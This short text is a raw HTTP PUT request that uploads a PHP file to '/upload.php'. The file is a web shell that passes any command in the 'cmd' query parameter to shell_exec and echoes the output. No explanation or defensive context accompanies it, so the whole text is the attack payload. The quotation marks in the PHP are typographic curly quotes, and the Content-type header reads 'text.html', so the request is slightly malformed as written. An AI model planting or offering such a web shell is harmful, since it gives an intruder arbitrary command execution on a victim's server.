PUT /upload.php HTTP/1.0
Content-type: text.html
Content-length: 130
<?php
if (isset($_GET[‘cmd’]))
{
    $cmd = $_GET[‘cmd’];
    echo ‘<pre>’;
    $result = shell_exec($cmd);
    echo $result;
    echo ‘</pre>’;
}
?>
